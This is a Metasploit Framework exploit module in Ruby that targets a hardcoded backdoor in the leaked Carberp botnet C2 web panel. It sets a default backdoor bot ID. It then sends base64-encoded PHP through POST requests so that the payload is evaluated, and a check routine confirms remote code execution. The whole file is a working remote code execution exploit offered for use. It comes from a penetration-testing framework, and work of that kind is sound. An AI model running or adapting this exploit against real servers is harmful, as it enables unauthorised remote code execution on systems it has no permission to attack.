# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Carberp Web Panel C2 Backdoor Remote PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits backdoors that can be sighted all over the leaked
        source code of the Carberp botnet C2 Web Panel.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;bwall(Brian Wallace) <bwallace[at]cylance.com>&#039;, # msf module
          &#039;connection(Luis Santana) <hacktalkblog[at]gmail.com>&#039;, # exploit reporting
          &#039;Steven K <xylitol[at]malwareint[d0t]com>&#039; # discovery and reporting
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://www.xylibox.com/2013/06/carberp-remote-code-execution-carpwned.html&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Keys&#039;        => [&#039;php&#039;],
          &#039;Space&#039;       => 10000,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;carberp&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 28 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,[true, "The path to the backdoor, often just index.php", "/index.php"]),
        OptString.new(&#039;BOTID&#039;, [true, &#039;Hardcoded backdoor bot ID that can run PHP eval&#039;, &#039;BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV&#039;]),
      ],self.class)
  end

  def check
    confirm_string = rand_text_alpha(8)
    cmd = "echo &#039;#{confirm_string}&#039;;"
    shell = http_send_command(cmd)
    check_code = Exploit::CheckCode::Safe

    if shell and shell.body.include?(confirm_string)
      check_code = Exploit::CheckCode::Vulnerable
    end

    check_code
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s)
    request_parameters = {
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039;  =>
        {
          &#039;id&#039; => datastore[&#039;BOTID&#039;],
          "data" => Rex::Text.encode_base64(cmd.unpack(&#039;H*&#039;))
        }
    }
    res = send_request_cgi(request_parameters)

    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end

